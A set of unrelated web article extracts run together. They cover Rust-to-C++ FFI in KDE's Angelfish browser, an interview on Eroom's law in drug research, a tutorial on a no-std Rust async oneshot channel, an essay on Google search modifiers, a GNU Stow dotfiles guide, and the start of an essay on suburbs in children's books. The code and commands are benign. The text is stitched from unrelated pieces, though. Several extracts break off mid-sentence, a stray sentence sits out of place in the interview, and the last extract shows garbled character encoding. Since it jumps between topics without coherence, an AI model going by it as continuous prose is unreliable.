  <li><code>extern "C"</code> tells that this function should use the C calling conventions.</li>
</ul>

<p>Every time we interact with data from C, the rust compiler is unable to run its usual safety checks.
For that reason we need unsafe blocks around those lines of code.
If anything unexpectedly segfaults, it’s likely to be in our unsafe blocks.
To get a string that we can feed into a usual rust API, we can use <code>unsafe { CStr::from_ptr(public_domain_suffix_file).to_str() }</code>.</p>

<p>For more examples of how to interact with the C / C++ side, feel free to have a look at <a href="https://invent.kde.org/plasma-mobile/plasma-angelfish/-/blob/20e166c0fe2e38be63824b957c02fa58865ac67c/src/rs/adblock/src/adblock.rs">some real code in Angelfish</a>.
I’m by no means an expert on this, but it should help you get started.</p>

<p>Using this approach, the ad block could successfully be implemented in about 140 lines of rust code, of which only half is FFI code, and the rest actual logic.</p>

<h2 id="approach-2">Approach 2</h2>
<p>The second approach is to use the cxx crate (library), which can generate most of the boilerplate FFI code automatically, and provides a modern API on the C++ side.
To do that, it implements its own wrapper types, each wrapping the functionality of one type of one of the languages. Those wrapper types are implemented in both languages, and allow easily passing more advanced types than pointers and number types through the FFI boundary.
On the rust side, the wrapper types are not really visible, because a macro generates everything for us.</p>

<p>The only unusual thing on the rust side will be a small ffi module, declaring which types and functions we want to expose to C++:</p>
<pre><code>#[cxx::bridge]
mod ffi {
    extern "Rust" {
        type Adblock;
        type AdblockResult;

        fn new_adblock(list_dir: &amp;str, suffix_file: &amp;str) -&gt; Box&lt;Adblock&gt;;
        fn should_block(
            self: &amp;Adblock,
            url: &amp;str,
            source_url: &amp;str,
            request_type: &amp;str,
        ) -&gt; Box&lt;AdblockResult&gt;;
    }
}
</code></pre>

<p>All objects are returned as smart pointers, like <code>Box</code>.
On the C++ side, this will result in a <code>rust::Box&lt;Adblock&gt;</code>, which is a type generated by the cxx_build crate, which is doing something slightly similar to cbindgen.</p>

<p>With the cxx crate, our build.rs will look like this:</p>
<pre><code>extern crate cxx_build;

fn main() {
    cxx_build::bridge("src/adblock.rs").compile("angelfish-adblock")
}
</code></pre>

<p>You may wonder, if the cxx crate makes everything so easy, why did I start with approach 1 at all?
I had had a look at the cxx crate a few month ago, when it was still too minimal to do what I needed. Luckily I had another look, since it has become really useful in the meantime.
However learning the raw ffi way was important to understand what actually happens in the background, and I’d almost recommend everyone to have a look at that first before using the cxx crate. Using <code>cargo expand</code> you can then understand what cxx generated for you.</p>

<p>Given the cxx crate makes this so much easier, I initially feared it might add tons of new dependencies and increase the build time, but to my surprise it actually has a lot less dependencies than cbindgen. Even though cbindgen only uses those at build time (they don’t end up in the binary), they take some time to build.</p>

<p>Angelfish has recently switched to using the cxx crate, so you find usage examples in the <a href="https://invent.kde.org/plasma-mobile/plasma-angelfish/-/blob/d92e48e392303deda6cf3c1552f9f7b5189e2953/src/rs/adblock/src/adblock.rs">current version of the ad block code</a>.</p>

<h2 id="build-system">Build system</h2>
<p>After we have written the FFI, we need to build the Rust code as part of our project, most likely using CMake. This could be very annoying and complicated, but luckily <a href="https://github.com/AndrewGaspar/corrosion">Corrosion</a> exists to make this very easy for us.
It can build our rust code using the cargo build system, and create CMake targets for the library we built, so its easy to link against it.</p>

<h2 id="usage-in-kde">Usage in KDE</h2>
<p>Now that the implementation part is explained,
it makes sense to look into where this can be useful and where not.
Unfortunately the truth is that some distros are still not fully happy with having to package rust code,
because the rust community has a different approach to sharing code than known from the C / C++ world.
While Qt re-implements some functionality also found in other C++ libraries, to only make it necessary to package Qt and not one library for json, one for xml, for http and so on, the rust community likes to split everything into small packages, so no unnecessary code is included.</p>

<p>In Angelfish, all the rust code is optional, and Angelfish can of course still be built without Rust.</p>

<p>Possible areas in KDE that could profit from using Rust are icon and SVG theme rendering code, which could profit from using rsvg or resvg.
I can imagine it could also be useful for document thumbnailers, when a rust implementation of the file type already exists. A similar case could be KIO workers, and pretty much any other project that can profit from optional plugins.</p>

<h2 id="conclusion">Conclusion</h2>
<p>This approach to using Rust in KDE allows to make use of the many libraries and language features the ecosystem provides, without running into the infamous “rewrite it in Rust” reflex. It avoids having to create rust bindings for all KDE Frameworks and Qt only to make use of Rust, and still produces readable code.</p>

While computers got faster and cheaper year after year for the last five decades, healthcare costs shot three to four times higher than inflation in the last two decades <span>alone.<sup><a href="#fn2" id="r2">2</a></sup></span></p> <p>And if the recent coronavirus pandemic that swept the globe in a few short weeks has shown us anything, it’s how close our healthcare systems truly are to their breaking point.</p> <p>Yet, unlike other stagnant technology areas, like defense or nuclear energy, most people will agree that healthcare is both badly broken and vital to fix, so by starting there at least, fewer people will try to stop an ambitious founder.</p> <p>Of all the healthcare fields that one could start with, many fashionable and less fashionable areas receive a fair bit of attention already from venture capitalists and philanthropists—it’s hard to tell them apart sometimes. Yet there’s one big area that has stagnated despite the close scrutiny it receives, and that’s pharmaceuticals.</p> <p>The great promise was that by unlocking the secrets of biology, we would create all kinds of life-saving, even life-enhancing medicine, from a full-course-meal in a pill to a general cancer cure.</p> <p>Moreover, breakthroughs in pharma would open up new avenues of research in many ancillary fields, from nutrition and anti-aging to preventative medicine writ large. The more progress we’d make, the less effort we’d have to put in to uncover new secrets.</p> <p>However, today’s pharma industry looks nothing of the sort. Looking from the outside, it seems that despite a growing mountain of scientific and technical know-how, the cures only seem to get harder and harder to find. So, one might reasonably ask: What went wrong?</p> <p>To cut the Gordian knot of pharma’s long stasis, we must turn to the one robust measure of progress the industry has, known simply as Eroom’s law. The name is already very suggestive, as it’s quite literally an ironic backward spelling of Moore’s law—the computer industry’s relentless benchmark of progress—which makes it a fitting place to&nbsp;start.</p> <p>Race to the bottom</p> <p>Eroom’s law is the observation that the cost of developing a new drug roughly doubled every nine years from 1950 through 2010. All in all, it shows a roughly 80-fold decline in the productivity of drug R&amp;D.</p> <p>It’s hard to say what’s worse, the staggering decline, or the fact that it went on unchecked for six decades. Either way, as the total sum of our efforts to look for life-saving secrets, Eroom’s law leaves no doubt that our ability to explore the frontier has atrophied catastrophically.</p> <figure> <img alt="A graph of Eroom’s law shows that the cost of developing a new drug roughly doubled every nine years from 1950 through the 2010." id="img-eroom-1" src="https://refoundable.com/assets/img/buf.png" data-echo="/assets/img/eroom-1.png"> <figcaption id="cap-eroom-1">By 2010, the total R&amp;D spend per drug approved was about a&nbsp;hundred times higher, in real dollars, than it was in 1950.<span>Graph by Jack Scannell</span></figcaption> </figure> <p>Although some aspects of this disturbing trend line were known since the 1980s, Eroom’s law was formally articulated in 2012, at the tail end of the long decline, in a seminal paper published in <em>Nature Reviews Drug Discovery</em> by four co-authors led by Jack Scannell.<sup><a href="#fn3" id="r3">3</a></sup></p> <p>In a field plagued by narrow specialization, Jack Scannell is something of a renaissance man, having seen the industry from a distance and up close while working in drug research, private consulting, pharma and biotech investing, and policy advising.</p> <p>When Scannell worked as an investment analyst, he used to ask the top executives at major pharma firms to explain why the productivity of drug R&amp;D kept falling for so long, when the science and technology inputs were getting cheaper and more efficient all the time. Generally, he’d get the same kind of answer: the industry had run out of “low-hanging fruit.”</p> <p>In the course of his own later investigations, Scannell began to focus on a serious technical problem called “model validity,” which he found was holding back progress in the science of drug discovery.

What moved you to write it? And how did you land on the term Eroom’s law?<a href="#q1"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a></p> <p>There was this nagging puzzle: Since the 1950s, lots of important R&amp;D inputs had got tens, hundreds, even billions of times cheaper, while the number of drugs approved per $1 billion spent on R&amp;D had fallen by roughly two orders of magnitude. That struck me as an ugly contrast.</p> <p>Many people bemoaned the R&amp;D productivity problem before, but not enough people had drawn attention to the contrast between input and output efficiency. I thought it was an important public policy problem, and it seemed to attract less attention than it deserved.</p> <p>I remember talking about the contrast with a friend of mine, William Bains. We chatted that drug industry productivity looked like Moore’s law backwards, and that’s how the term “Eroom’s law” was born.</p> <p id="q2">The drug industry already knew it had an R&amp;D productivity problem, so what was missing in previous attempts to diagnose the issue?<a href="#q2"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a></p> <p>As long ago as 1980, there was a great paper on the R&amp;D slowdown by Fred Steward and George Wibberley, which we cited along with some other good work in our <span>paper.<sup><a href="#fn4" id="r4">4</a></sup></span></p> <p>However, in general, I thought there were two problems:</p> <p>First, a lot of the diagnostic efforts were private. They were happening in some of the drug and biotech companies, but they weren’t making it into the public domain, so they couldn’t affect science policy or investor behavior.</p> <p>Second, what did often make it into the public domain were not really diagnoses per se, but attempts to sell “solutions” that, in many cases, were largely unrelated to the core problems of drug R&amp;D.</p> <p>If, for example, you were an academic geneticist, low R&amp;D productivity was an occasion to promote more investment in genomics. If you were an investment bank, you saw an opportunity to promote M&amp;A to Big Pharma. If you were a consulting firm, you might say that the reporting lines or the business processes were wrong; things you could fix with a re-engineering project.</p> <p>At the time, I was working as an investment analyst. A bad prognosis can be very interesting to an analyst, because if you think an industry is in real trouble, you don’t have to own it. That meant I had a different set of biases to most people. And I didn’t have any particular solution to sell.</p> <p>On the whole, I think lots of people would’ve been better qualified to write the paper, but their day jobs meant they couldn’t write it.</p> <p id="q3">Eroom’s law was widely adopted after your paper came out. What was the general reaction you saw after you published?<a href="#q3"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a></p> <p>People were certainly glad that someone had put names to things that they knew, or suspected, were happening already. Apart from Eroom’s law itself, people liked something else we talked about in the paper, which I called the “Better than the Beatles” problem.</p> <p>Imagine how hard it would be to sell new pop songs if every new song had to be better than the Beatles, if you could download all the old Beatles records for free, and if no one ever got bored of listening to the same Beatles songs over and over again.</p> <p>That’s analogous to the problem the drug industry faces, in that some old drugs are very good, they cost next to nothing when their patents expire, and doctors don’t get bored of prescribing them.</p> <p>So in many therapy areas, you end up with this ever-expanding back catalog of virtually free and very good medicine, against which any new medicine would have to compete. That reduces the value of as-yet-undiscovered drugs. It also pushes drug R&amp;D towards the areas where we don’t have a catalog of good cheap stuff, or precisely the areas where R&amp;D is likely to be harder.</p> <p>Inevitably, people also appropriated Eroom’s law to justify what they wanted to do anyway. That reminds me of a line from a famous British TV comedy, <em>Yes, Prime Minister</em>, which is about a hapless politician who is ruthlessly managed by his civil servants: “Something must be done. This is something. Therefore, we must do it.” I do occasionally see papers that make the same kind of <span>argument.<sup><a href="#fn5" id="r5">5</a></sup></span></p> <p>However, to be honest, apart from a few people in the drug industry telling me that the paper became required reading, and aside from seeing the Eroom graph in a lot of presentations, it’s not clear to me that anything different was done after the paper was read.</p>  <hr>  <p id="q4">The standard fixes to raise drug R&amp;D productivity tend to focus on process efficiency and cost-cutting. Why haven’t these solutions been enough to stop and reverse Eroom’s law?<a href="#q4"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a></p> <p>Simply put, they’re addressing the wrong class of problems.

It would be obvious that there’s a geological explanation for the problem.</p> <p>When drug companies talk to their shareholders, I suspect they talk about processes …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Concurrency isn't easy and implementing its primitives is even harder. I found myself in need of
some no-std, no-alloc Rust async concurrency primitives and decided to write some. I kept the
scope small so even you and I can understand it. Even so, it still involved futures, wakers,
atomics, drop and unsafe. I'll introduce each of those to you while building a simple primitive.
At the end, even you will be able to implement your own primitives!</p><div><p>First, our primitive:</p><pre><code>//! A oneshot channel is a synchronization primitive used to send a single
//! message from one task to another. When the sender has sent a message and it
//! is ready to be received, the oneshot notifies the receiver. The receiver is
//! a Rust async `Future` that can be `await`ed. Our implementation does not
//! depend on std or alloc.
//!
//! See https://tweedegolf.nl/blog/50/build-your-own-async-primitive 
//! for a full description of the internals.</code></pre><p>What do we mean by all that? First, not depending on std or alloc means we can't use many
common libraries. Rust async is still a new area and the libraries so far depend on
allocating memory at least. That makes their primitives easier to build but also unusable on
embedded devices which can't afford an allocator. I work with such devices regularly and so I've
learned to avoid allocation whenever possible. We'll see that we can write our oneshot without
allocation just fine.</p><p>Next, we don't want to block the entire CPU while waiting for the message to be sent. For one
thing, it won't be sent if the CPU is blocked. When an operating system is available, it can
schedule the sending task while the receiving task is blocked and there's no problem. Small
embedded devices usually can't afford an operating system though, so you're left with
implementing task switching manually. That can involve a lot of moving state from your only call
stack into a struct and back so you can use the call stack to continue another task.</p><p>Rust async can do it for you: First, you choose an async executor to run your tasks. These
executors can be much simpler than even an embedded OS. Then you write your tasks as normal.
When you reach a point where you need to wait for another task to finish something, you just
write <code>.await</code>. The executor will store the state of your call stack and continue with a task
that isn't blocked. When the thing you were waiting for is done, the executor will wake your
task up again.</p><p>Let's begin with a <code>Oneshot</code> struct which will contain the data both the sender and receiver
need to access in order to transfer the message. It needs to be created high on the call stack
so it will outlive all tasks that might reference it. Then we create a <code>Sender</code> and <code>Receiver</code>
struct which contain a reference to the <code>Oneshot</code>. We can then give the sender to one task and
the receiver to another. Since they both have a reference to the <code>Oneshot</code>, they must be shared
references, which means we can't safely modify just anything inside. Instead, we need to use
types which are safe to modify through shared references.</p><h3 id="the-message">The message</h3><p>First, we need a way to transfer the message from the sender to the receiver. We could move it
directly if we wait for both the sender and receiver to be ready for the transfer: We'd know
where the data is on the sender side and where it should go on the receiver side. We call this
synchronous communication, both the sender and the receiver need to be ready before the
communication happens. It has its uses, but in this case, we don't want the sender to wait for
the receiver since it won't get a response back anyway. Instead, we'll store the message in the
<code>Oneshot</code> where it can wait for the receiver to be ready.</p><p>We don't want to restrict our oneshot to just one kind of message, so we'll generalize it over
the type of the message. We'll call that type <code>T</code>. When we create a new <code>Oneshot</code> we won't have
a message for it yet so we need to tell Rust we'll initialize it later. In Rust, you'd usually
use an <code>Option&lt;T&gt;</code> but we're going to track whether we have a <code>T</code> in a separate field so we'll
use a <code>MaybeUninit&lt;T&gt;</code> instead. Finally, we need to modify the field through a shared reference.</p><p>We'll store an <code>UnsafeCell&lt;MaybeUninit&lt;T&gt;&gt;</code> which allows us to modify the message through a
shared reference as long as we do so in a block of code marked as <code>unsafe</code>. An <code>unsafe</code> block
just means we make it our own responsibility to check the code is safe instead of the
compiler's. We need to do this whenever the safety logic is too complicated for the compiler to
understand.</p><h3 id="the-synchronization">The synchronization</h3><p>Next, we need to remember whether the message is ready to be received, or in other words,
whether the <code>message</code> field has been initialized. This is not as easy as it seems. Both
compilers and processors will reorder memory accesses in order to make your code run faster.
They'll make sure the code in a single task seems like it ran in the right order, but they won't
give the same guarantee for code running in different tasks. For example, if we had used an
<code>Option&lt;T&gt;</code> to store the message, the sender might turn it into a <code>Some()</code> first and store the
message afterwards. If the receiver happened to check in between, it would try to read a message
before there was ever stored one and it would end up with a bunch of garbage.</p><p>In order to make concurrent memory accesses safe, atomics were invented. We'll remember if we
have a message with an <code>AtomicBool</code>. Atomics make sure no task sees a partial update of the
atomic. The atomic either updates completely or not at all. On top of that, it also helps us
synchronize access to other memory: The value of the <code>AtomicBool</code> determines whether we allow
the sender or the receiver to access the message. That way, they never access it at the same
time.</p><p>Finally, we want to use Rust async/await to wait until the message is ready. This requires us to
store a waker. To be able to update the waker from a shared reference, we use the very nice
<code>AtomicWaker</code> from the <code>futures</code> library.</p><pre><code>use core::cell::UnsafeCell;
use core::mem::MaybeUninit;
use core::sync::atomic::{AtomicBool, Ordering};
use futures::task::AtomicWaker;

/// Transfer a single message between tasks using async/await.
pub struct Oneshot&lt;T&gt; {
    message: UnsafeCell&lt;MaybeUninit&lt;T&gt;&gt;,
    waker: AtomicWaker,
    has_message: AtomicBool,
}</code></pre><p>The <code>Sender</code> and <code>Receiver</code> are just thin wrappers around <code>Oneshot</code> references. They are generic
over both the type of the underlying message (<code>T</code>) and the lifetime of the reference (<code>'a</code>).
Wrapping the references in a struct allows us to name them and dictate what operations they
support.</p><pre><code>pub struct Sender&lt;'a, T&gt;(&amp;'a Oneshot&lt;T&gt;);
pub struct Receiver&lt;'a, T&gt;(&amp;'a Oneshot&lt;T&gt;);</code></pre><p>It may seem like we're not going very fast but choosing the right data representation is often
the hardest part of programming. From a good data representation, the implementation will follow
naturally. We begin with the <code>new</code> function which allows the creation of a new <code>Oneshot</code>. We
have no message yet so we don't initialize it and set <code>has_message</code> to false.</p><pre><code>impl&lt;T&gt; Oneshot&lt;T&gt; {
    pub const fn new() -&gt; Self {
        Self {
            message: UnsafeCell::new(MaybeUninit::uninit()),
            waker: AtomicWaker::new(),
            has_message: AtomicBool::new(false),
        }
    }</code></pre><h3 id="the-unsafe">The unsafe</h3><p>Next, we implement the most basic operations, putting a message in and taking it out again.
We'll get to synchronization later, so these will be unsafe functions. For performance
reasons, users may want to use these functions directly so we'll make them public. This is
fine as long as we document what properties must hold to use the function safely.</p><p>The <code>put</code> function will store a message. Since we're implementing a oneshot, we only expect
one communication so we assume there was no message before <code>put</code> gets called. This is a
property a user of this unsafe function must be told about!</p><p>As soon as we set <code>has_message</code> to true, the receiver may try to read the message so we must
make sure to write the message first. We also need to prevent the write of the message and
of <code>has_message</code> from being reordered. We do that by storing <code>has_message</code> with
<code>Ordering::Release</code>. This is a signal to the compiler that it must make sure any memory
accesses before it must be finished and visible to other cores.</p><p>Finally, we use the waker in order to schedule the receiving task to continue.</p><pre><code>    /// NOTE(unsafe): This function must not be used when the oneshot might
    /// contain a message or a `Sender` exists referencing this oneshot. This
    /// means it can't be used concurrently with itself or the latter to run
    /// will violate that constraint.
    pub unsafe fn put(&amp;self, message: T) {
        self.message.get().write(MaybeUninit::new(message));
        self.has_message.store(true, Ordering::Release);
        self.waker.wake();
    }</code></pre><p>The <code>take</code> function will check if a message is available yet and take it out of the oneshot
if it is. This time, we use <code>Ordering::Acquire</code> in order to ensure all memory accesses after
loading <code>has_message</code> really happen <strong>after</strong> it. For every synchronization between tasks, a
<code>Release</code>-<code>Acquire</code> pair is needed. Sometimes synchronization needs to go both ways and
<code>Ordering::AcqRel</code> can be used to get both effects.</p><p>When we're done taking the message, we <code>Release</code> its memory again by setting <code>has_message</code>
to <code>false</code>. If two instances of <code>take</code> run concurrently, they might both reach the message
read before setting <code>has_message</code> to <code>false</code> and thus duplicate the message so we need to
disallow that in the safety contract.</p><p>On the other hand, if it is run concurrently with <code>put</code>, according to the contract of <code>put</code>,
there must be no message beforehand. If <code>take</code> loads <code>has_message</code> first, it finds no
message and returns. If <code>put</code> writes <code>has_message</code> first, there is guaranteed to be a
message ready so <code>take</code> takes it without issue. Therefor, a single <code>take</code> can be safely run
concurrently with a single <code>put</code>. This is exactly what we need for a oneshot channel. We
never expect either function to run more than once but a single message can be transferred
between tasks …</p></div></div>

This effect is happening again. Early adopters aren’t using Google anymore.</p> <p>They aren’t using DuckDuckGo either. They’re still using Google.com, but differently. To make Google usable, users are adding faux-query modifiers that to supress the “garbage Internet”.</p> <p>You see this in the typeahead logs.</p> <p><img src="https://dcgross.com/assets/new-google/image6.png" alt=""> <em></em></p><center><em>Products (Reddit)</em></center> <p><img src="https://dcgross.com/assets/new-google/image4.png" alt=""> <em></em></p><center><em>Services (Reddit, Yelp)</em></center> <p><img src="https://dcgross.com/assets/new-google/image1.png" alt=""> <em></em></p><center><em>Movies (Rotten Tomatoes)</em></center> <p><img src="https://dcgross.com/assets/new-google/image5.png" alt=""> <em></em></p><center><em>Even code (Github)</em></center> <p>Interestingly, this doesn’t work for all categories. <img src="https://dcgross.com/assets/new-google/image3.png" alt=""> <img src="https://dcgross.com/assets/new-google/image2.png" alt=""> <em></em></p><center><em>Recipes don’t have a “Reddit” equivalent</em></center> <h3 id="query-operators-mean-somethings-broken">Query Operators Mean Something’s Broken</h3> <p>More advanced users use modifiers like <code>site: filetype: intitle:</code> because adding “reddit” isn’t strict enough, as spammy websites often manipulate content to win SEO.</p> <p>How about those websites that stuff the year in the title? “Reviews UPDATED JANUARY 2020” are exploiting the fact that customers suffix queries with the year. What those people are trying to command is freshness, not a title match.</p> <p>Something’s broken, and a tiny share of Google is open for the taking. Obviously attacking incumbents head-on doesn’t work. Here are two alternative ideas for bootstrapping next-generation search:</p> <h3 id="1-boogle-a-query-reformulator">#1 Boogle, A Query Reformulator</h3> <p>Introducing Boogle, a proxy for Google that’s just Better Google Search. It’s a query expander. We predict the correct operators for your query, proxy Google’s results, and serve. For example:</p> <p><code>query("stripe.js example") -&gt; query("stripe.js example (site:github.com OR site:gitlab.com OR site:..."))</code></p> <p><code>query("is anker charger") -&gt; query("is anker charger (inurl:forum OR site:reddit.com OR ...))"</code></p> <p>Query topic modeling is a rich science with plenty of examples.</p> <p>You’d almost as fast as Google, never worse, and occasionally better. This will help build the reflex to use you instead. This approach isn’t that hard to get started with, and might work for the high-end users.</p>  <p>You could go after this vertical by vertical – build the <em>best</em> site for electric product search, for travel, for code, etc. A key question is how to build habitual recall to use your product over Google. Amazon and Airbnb both enjoy a huge amount of direct traffic. Some learnings from those:</p> <ul> <li><strong>Stellar mobile destination.</strong> Using Airbnb directly feels more fluid and fun than using Google for Airbnb.</li> <li><strong>The 90% Rule.</strong> To build reflex you need to give me what I want most of the time.** **With Prime, Amazon made it such that we stopped price comparing across other sites; Amazon would get it to us fastest, and that turns out to matter more than price. Most of the time you open Amazon.app, it satisfies.</li> <li><strong>Come for search, stay for something else.</strong> I don’t think of Airbnb or Amazon as search apps. They help me get things or book homes. You might want to your search app to be a destination for something else. This is where I think community comes in.</li> </ul> <p>Picking a vertical that <em>doesn’t</em> have strong typeahead completions[1] would help you build community around your search engine. Recipes, fitness, fashion, etc. don’t have decacorn conglomerates like Github or Reddit. That might mean it’s easier to build community around them, and put your flagship search engine on top.</p> <hr> <p>If you’re working on this kind of stuff, try out <a href="https://pioneer.app/">Pioneer</a> or just shoot me an email – daniel@pioneer.app.</p> <hr> <p>[1] In reality I’d pick the vertical _I _love most. If you’re a guitar player start with music; a movie buff should build better Rotten Tomatos. Etc.</p> </article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	   

<p>I accidentally stumbled upon something yesterday that I felt like
sharing, which fell squarely into the "why the hell didn’t I know about this
before?" category. In this post, I’ll describe how to manage
the various configuration files in your GNU/Linux home directory (aka
"dotfiles" like <code>.bashrc</code>) using GNU Stow.</p>

<p>The difficulty is that it would be helpful to manage one’s
configuration files with a version control system like Git, Mercurial
or Bazaar, but many/most dotfiles reside at the top-level of your home
directory, where it wouldn’t be a good idea to initialize a VCS
repository. Over time I’ve come across various programs which aim to
manage this for you by keeping all the files in a subdirectory and
then installing or linking them into their appropriate places. None of
those programs ever really appealed to me.  They would require a ton
of dependencies (like Ruby and a ton of libraries for it) or they
would require me to remember how to use them, which is difficult when
really for such a task you rarely use the program.</p>

<p>Lately I’ve been using <a href="http://www.gnu.org/software/stow">GNU Stow</a> to manage
programs I install from source to <code>/usr/local/</code>. Basically, in this typical
usage, you install locally built packages to
<code>/usr/local/stow/${PKGNAME}-{PKGVERSION}</code> and then from <code>/usr/local/stow/</code> you run
<code># stow ${PKGNAME}-${PKGVERSION}</code> and the program generates symbolic links to
all the programs' files into the appropriate places under <code>/usr/local/</code>. Then,
when you uninstall a program via Stow, you don’t have to worry about any stray
files that you or a provide Makefile may have missed. It also makes handling
alternate versions of a program quite easy (i.e. when I’m experimenting with
different configurations of <a href="http://dwm.suckless.org/">dwm</a> or
<a href="http://st.suckless.org/">st</a>).</p>

<p>Some time ago I happened across a mailing list posting where someone described
using Stow to manage the installation of their dotfiles. I didn’t pay much
attention to it but my brain must have filed it away for later. Yesterday I
decided to give it a try and I have to say that it is so much more convenient
than those other dedicated dotfile-management programs, even if it wasn’t an
immediately obvious option.</p>

<p>The procedure is simple. I created the <code>${HOME}/dotfiles</code> directory and then
inside it I made subdirectories for all the programs whose cofigurations I
wanted to manage. Inside each of those directories, I moved in all the
appropriate files, maintaining the directory structure of my home directory. So,
if a file normally resides at the top level of your home directory, it would go
into the top level of the program’s subdirectory. If a file normally goes in the
default <code>${XDG_CONFIG_HOME}/${PKGNAME}</code> location (<code>${HOME}/.config/${PKGNAME}</code>),
then it would instead go in <code>${HOME}/dotfiles/${PKGNAME}/.config/${PKGNAME}</code> and
so on. Finally, from the <code>dotfiles</code> directory, you just run <code>$ stow $PKGNAME</code>
and Stow will symlink all the package’s configuration files to the appropriate
locations. It’s then easy to make the <code>dotfiles</code> a VCS repository so you can
keep track of changes you make (plus it makes it so much easier to share
configurations between different computers, which was my main reason to do it).</p>

<p>For example, let’s say you want to manage the configuration for Bash, VIM and
Uzbl. Bash has a couple files in the top-level directory; VIM typically has your
.vimrc file on the top-level and a .vim directory; and Uzbl has files in
<code>${XDG_CONFIG_HOME}/uzbl</code> and <code>${XDG_DATA_HOME}/uzbl</code>. So, your home directory
looks like this:</p>

<pre><code>home/
    brandon/
        .config/
            uzbl/
                [...some files]
        .local/
            share/
                uzbl/
                    [...some files]
        .vim/
            [...some files]
        .bashrc
        .bash_profile
        .bash_logout
        .vimrc
</code></pre>

<p>You would then create a <code>dotfiles</code> subdirectory and move all the files there:</p>

<pre><code>home/
    /brandon/
        .config/
        .local/
            .share/
        dotfiles/
            bash/
                .bashrc
                .bash_profile
                .bash_logout
            uzbl/
                .config/
                    uzbl/
                        [...some files]
                .local/
                    share/
                        uzbl/
                            [...some files]
            vim/
                .vim/
                    [...some files]
                .vimrc
</code></pre>

<p>Then, perform the following commands:</p>

<pre><code>$ cd ~/dotfiles
$ stow bash
$ stow uzbl
$ stow vim
</code></pre>

<p>And, voila, all your config files (well, symbolic links to them) are
all in the correct place, however disorganized that might be, while
the actual files are all neatly organized in your <code>dotfiles</code>
directory, which is easily turned into a VCS repo. One handy thing is
that if you use multiple computers, which may not have the same
software installed on them, you can pick and choose which
configurations to install when you need them. All of your dotfiles are
always available in your <code>dotfiles</code> directory, but if you don’t need
the configuration for one program, you simply don’t Stow it and thus
it does not clutter your home directory.</p>

<p>Well, that’s all there is to it. Hopefully someone else out there
finds this useful! I know I’ve found it to be a huge help.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>Once upon a time,</strong> there were four little rabbits, and their names were Flopsy, Mopsy, Cottontail and Peter. They lived with their mother in a sandbank underneath the root of a very big fir tree. One day, their mother dropped them off at soccer practice and picked them up promptly afterward. When they got home, they all had bread and milk and blackberries.</p>
<p>That is roughly how the classic Beatrix Potter story from 1902 would go if it had been set in the American suburbs. But even if Potter hadnâ€™t set her books in Englandâ€™s Lake District, she would never have chosen a suburban setting. The suburbs kill the narrative adventure that is the lifeblood of childrenâ€™s literature.</p>
<p>Reading picture books to my children over the past 10 years, Iâ€™ve noticed how many of the stories shun a suburban setting. This is no accident: the tales that most grip the imagination of children (and adults), with few exceptions, require rural or urban locations for their drama and vitality.</p>
<p>To simplify, the antithesis of North American suburbia is walkability, and picture books with literary merit love walkability. Compelling childrenâ€™s stories require that their characters are able to navigate their setting at a pedestrian scale and pace. For example, in the US author Arnold Lobelâ€™s classic stories of the 1970s, Frog and Toad never appear in a car, despite being thoroughly anthropomorphised. What most draws the reader into the stories are the adventures that the amphibians experience between their houses â€“ in the meadow, the woods and the tall grass. They climb mountains and swim in ponds, but they also walk everywhere: to fly a kite, to buy ice-cream, to fulfil a to-do list.</p>
</div><div><figure data-align="center"><img src="https://d2e1bqvws99ptg.cloudfront.net/user_image_upload/1372/insert-Frog-and-Toad.jpg" alt="" title=""><figcaption>From <i>Adventures of Frog and Toad</i> by Arnold Lobel. <i>Image Â© the Estate of Arnold Lobel/Amazon</i></figcaption></figure></div><div>
